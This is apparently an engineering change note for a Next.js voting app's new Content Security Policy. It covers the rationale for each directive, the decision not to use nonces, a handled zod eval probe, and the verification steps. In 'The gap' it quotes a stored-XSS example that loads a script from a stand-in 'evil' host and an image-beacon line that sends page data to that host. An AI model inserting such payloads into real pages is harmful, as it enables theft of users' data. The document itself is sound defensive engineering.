# Fix: full resource-restricting CSP (v0.9.53)

**Branch:** `fix/security-headers-csp` · **One file:** `next.config.ts`
**Supersedes the deferral in** `docs/2026-09-01/security-headers.md`

## The gap

v0.9.44 shipped six security headers, but its CSP deliberately covered only the four directives
that cannot break anything — `base-uri` · `object-src` · `frame-ancestors` · `form-action`. Nothing
restricted where scripts, styles, images, fonts or XHR could come from. A stored-XSS payload could
load `<script src="https://evil/">` or beacon data out with `new Image().src='//evil/'+data`.

## What shipped

```
default-src 'self';
script-src  'self' 'unsafe-inline';            (+ 'unsafe-eval' in dev only)
style-src   'self' 'unsafe-inline';
img-src     'self' https://pub-….r2.dev https://lh3.googleusercontent.com;
font-src    'self';
connect-src 'self';                            (+ ws: wss: in dev only)
frame-src 'none'; object-src 'none'; base-uri 'self';
form-action 'self'; frame-ancestors 'none';
upgrade-insecure-requests;                     (production only)
```

The five non-CSP headers (HSTS · X-Frame-Options · X-Content-Type-Options · Referrer-Policy ·
Permissions-Policy) are **unchanged**. The policy is uniform on every route — including `/api/*`,
since `headers()` uses `source: "/:path*"` — so an existing vs. a missing election on
`/results/[id]` still gets byte-identical headers (no existence oracle).

## The one decision that shapes everything: no nonce

`context/features/final-checklist.md` prescribed a **nonce middleware in `proxy.ts` + `strict-dynamic`**.
That was **not built**, because Next's own CSP guide states:

> When Content Security Policy (CSP) nonces are used, all pages in your Next.js application must be
> dynamically rendered. This means static optimization and Incremental Static Regeneration (ISR) are
> disabled.

A nonce is per-request; ISR caches HTML. The cached page would carry the nonce of whichever request
filled the cache while the response header carries a fresh one — so **every script on that page is
blocked**. Following the checklist literally would have cost two deliberately-shipped features:

1. **ISR on `/results/[id]`** (v0.9.38) — the app's only cached route, pinned by two assertions in
   `src/lib/static-route-boundaries.test.ts`. It is also the route a whole voter cohort opens at
   once, and the one that lets the Neon compute stay asleep.
2. **Static prerender of `/hr` + `/en`** (v0.9.45) — `(marketing)/loading.tsx` was made a client
   component *specifically* to achieve this, which is what closed Gate 13.

So the fix delivers the checklist's **goal** and declines its **mechanism**. `proxy.ts` is untouched.

### The cost, stated plainly

`script-src` carries `'unsafe-inline'`, so an **injected inline `<script>` still executes**. What
still contains it: `connect-src 'self'` (nowhere to send stolen data), the `img-src` allowlist (no
beacon), and a `script-src` with no host wildcard (no `<script src="https://evil/">`). The residual
gap is narrow *in this codebase*: no React raw-HTML slot receives user data (the only
`dangerouslySetInnerHTML` is a hardcoded chart-colour `<style>` in `ui/chart.tsx`), React escapes by
default, and session cookies are httpOnly.

**Rejected alternative** (recorded so it is not re-proposed): a hybrid — nonce on the dashboard host,
nonce-less on the apex — is buildable, since every `(app)` route is already dynamic via
`requireSession()`. It was declined because it splits the CSP across two files, leaves `/api`
uncovered (the proxy matcher skips it), and applies strictness to the auth-gated half while the
public half, which faces anonymous traffic, keeps the looser policy.

## Why each origin is in the list

| Directive | Why this value |
| --- | --- |
| `script-src 'unsafe-inline'` | Next's inline bootstrap (`self.__next_f.push`). `'unsafe-eval'` is turbopack-only and must never reach production. |
| `style-src 'unsafe-inline'` | `ui/chart.tsx` injects a `<style>` element; recharts writes inline `style` attributes. |
| `img-src` two hosts | The R2 **public** bucket (org logos, admin avatars) and Google OAuth avatars. Both render as plain `<img>`, deliberately outside `next/image` remotePatterns, and both arrive as **runtime DB values** — so they never appear in the bundle and must be named here. Same host in `.env.development` and `.env.production`. |
| `font-src 'self'` | `next/font/google` self-hosts to `/_next/static/media/` at build (20 `.woff2` verified) — no CDN fetch. |
| `connect-src 'self'` | No client-side third-party SDK: no analytics, no Stripe.js (`stripeClient()` only adds calls to our own routes). Stripe Checkout is a **navigation**, which `connect-src` does not govern. |

The bucket host is a **literal, not `process.env`**: `headers()` is evaluated at build time, so a
missing variable would silently drop the origin and break every logo in production with no error
anywhere. The URL is public — it is already in the HTML of every page that renders a logo.

**`data:` and `blob:` were deliberately removed from `img-src`.** Nothing emits them: all three QR
usages are `QRCodeSVG` (inline `<svg>`), there is no `toDataURL`/`readAsDataURL`, no
`placeholder="blur"`, the built CSS contains zero `url(data:…)`, and the two `createObjectURL` uses
hang off `<a download>`, which CSP does not govern. Add `data:` back if a blur placeholder or an
in-browser image preview is ever introduced.

## Known residual: one console error, and why it was left

A **production** chunk trips `script-src` with a blocked eval. It is **zod v4's JIT feature-probe**:

```js
if (jitless || …) return false;
try { return Function(""), true } catch (e) { return false }
```

Zod compiles validators with `Function` for speed and detects support inside its own `try/catch`.
CSP blocks the probe, zod catches it and **falls back to the interpreted validator**. Verified
working, not assumed — an invalid email on `/hr/login` still produced `aria-invalid="true"`, the
localized toast *"Unesite ispravnu e-mail adresu."*, and a blocked submit.

- **`'unsafe-eval'` was NOT added.** That would gut `script-src` to silence a handled probe.
- Cost: one console error on pages that parse a zod schema, plus a slightly slower validation path.
- **Follow-up worth its own branch:** `z.config({ jitless: true })` silences it, but zod's config is
  global to a module instance and schemas are built inside ~8 client components, so applying it
  cleanly means a shared zod module + rewriting every import — a refactor that does not belong in a
  security-header diff. **Do it before D9 error tracking lands**, or it becomes recurring Sentry noise.

## Traps for the next person

- **`next start` can NEVER pick up a `headers()` edit.** The CSP is baked into
  `.next/routes-manifest.json` at build time. Restarting the server serves the **old** policy, so
  verifying a CSP tweak by restarting tests the previous value and concludes wrongly.
  **A rebuild is mandatory.** (Cost one false result while building this.)
- **Verify against a production build, never `next dev`.** The `'unsafe-eval'` finding above only
  exists in a production bundle; a dev pass (which allows eval) would have reported everything clean.
- **`upgrade-insecure-requests` must stay production-only** — over `http://localhost` it upgrades
  every request to https and breaks dev outright.
- **Playwright `evaluate` runs via CDP and bypasses page CSP.** `Function("")` succeeds there while
  the page's own code is blocked, so it cannot be used to measure enforcement — only real page
  behaviour can.
- **Test an allowlist with a negative control.** "No CSP error" is also what you get when an image
  never loads at all. The check used here: inject three `<img>` probes and confirm the two allowed
  hosts reach the network while a disallowed one logs `blocked … (img-src)`.
- **netstat filters:** write `:3000 .*LISTENING`, not `LISTENING.*:3000` — the port precedes the
  state in netstat output, so the reversed pattern silently reports "free" while a server is running.
- Running a production build locally returns **403 `INVALID_ORIGIN`** on sign-in: `.env.production`
  sets better-auth's `trustedOrigins` to `dashboard.electius.com`. Override
  `NEXT_PUBLIC_APP_URL` / `NEXT_PUBLIC_MARKETING_URL` / `BETTER_AUTH_URL` to localhost for the test
  window. This is a harness artifact, not an auth bug.

## Verification

- `npm run lint` 0 errors (7 pre-existing `window.location.assign` warnings) · `npx tsc --noEmit`
  clean · `npm run test` **758 passing / 42 files** (config-only change) · `npm run build` clean.
- **Production build + `next start`.** CSP byte-identical across all four chromes; `'unsafe-eval'`,
  `ws:` and `nonce-` all absent; `upgrade-insecure-requests` present.
- **No oracle:** published vs DRAFT vs nonexistent `/results/[id]` → **603-byte identical** header block.
- **Both protected features intact:** `/[locale]/results/[id]` still `●` in the build table, `/hr`
  and `/en` still in the prerender manifest.
- **Browser, all four chromes, 0 CSP violations apart from the zod probe:**
  - `(marketing)` `/hr` — 5 images incl. lazy-loaded and one inside a `<dialog>`, demo modal opens,
    fonts loaded, inline bootstrap ran.
  - `(voter)` `/hr/results/[id]` (ISR) and `/hr/vote/[id]` QR entry.
  - `(auth)` `/hr/login` — zod validation proven still working.
  - `(app)` `/hr/home` and `/hr/elections/[id]/results` — **recharts rendered** (2 SVGs, 20 and 9
    shapes), shadcn's injected `<style>` present, 26 inline `style` attributes.
- **`img-src` allowlist proven with a negative control:** `r2.dev` and `lh3.googleusercontent.com`
  reached the network; `https://example.com` was blocked with `img-src`.
- Fixture: a throwaway admin in the elections-owning org, destroyed afterwards; dev DB SQL-proven
  back to baseline (users 2 · orgs 2 · accounts 2 · sessions 0 · elections 19 · 0 probe rows).

**Not verified (stated, not implied):** a real R2 logo or Google avatar rendering end-to-end — the
dev DB holds only `/demo/org-logo.png`, a same-origin `public/` asset, so no such URL exists to
render; the allowlist was proven by the probe above instead. Deployed production was not touched.

## Files

- `next.config.ts` — `R2_PUBLIC_BUCKET` / `GOOGLE_AVATARS` constants, `isDev`, `contentSecurityPolicy`,
  and `securityHeaders` now referencing it. No other file changed.
